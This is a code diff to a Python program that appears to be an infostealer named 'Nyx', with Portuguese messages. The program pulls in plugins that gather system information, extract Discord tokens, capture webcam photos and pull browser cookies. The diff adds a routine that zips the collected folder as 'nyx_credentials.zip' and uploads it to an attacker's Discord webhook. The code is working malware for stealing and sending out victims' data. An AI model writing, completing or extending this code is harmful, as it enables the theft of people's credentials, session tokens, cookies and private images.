@@ -3,6 +3,7 @@ import requests
 import os
 import json
 import sys
+import zipfile
 from plugins.systeminfo import obter_informacoes_sistema
 from plugins.discordtoken import TokenExtractor
 from plugins.webcam import capture_photo
@@ -25,6 +26,7 @@ appdata_local = os.getenv('LOCALAPPDATA')
 pasta_nyx = os.path.join(appdata_local, 'Nyx')
 if not os.path.exists(pasta_nyx):
     os.makedirs(pasta_nyx)
+zip_file_path = os.path.join(appdata_local, 'nyx_credentials.zip')
 
 def load_config():
     config_path = os.path.join(sys._MEIPASS, 'config.json') if hasattr(sys, '_MEIPASS') else 'config.json'
@@ -60,6 +62,22 @@ def enviar_imagem_para_discord(caminho_foto):
         response = requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
         if response.status_code != 200:
             print(f"Erro ao enviar para o Discord: {response.status_code} - {response.text}")
+
+def enviar_arquivo_zip_webhook(zip_file):
+    with open(zip_file, 'rb') as file:
+        payload = {
+            'username': webhook_username,
+            'avatar_url': webhook_avatar
+        }
+        files = {
+            'file': file
+        }
+        response = requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
+        
+        if response.status_code == 200:
+            print('Arquivo enviado com sucesso.')
+        else:
+            print(f'Erro ao enviar o arquivo: {response.status_code}, {response.text}')
 
 def enviar_para_discord(mensagem, embed=None):
     payload = {
@@ -326,6 +344,18 @@ if __name__ == "__main__":
 
         if cfg.get("cookies", False):
             executar_cookie_extractor()
+
+        if not os.path.exists(pasta_nyx):
+            print(f"A pasta '{pasta_nyx}' não existe.")
+        else:
+            with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                for root, dirs, files in os.walk(pasta_nyx):
+                    for file in files:
+                        file_path = os.path.join(root, file)
+                        zipf.write(file_path, os.path.relpath(file_path, pasta_nyx))
+
+            print(f"Pasta 'Nyx' compactada em: {zip_file_path}")
+            enviar_arquivo_zip_webhook(zip_file_path)
 
     except Exception as e:
         print(f"Ocorreu um erro durante a execução do script: {e}")
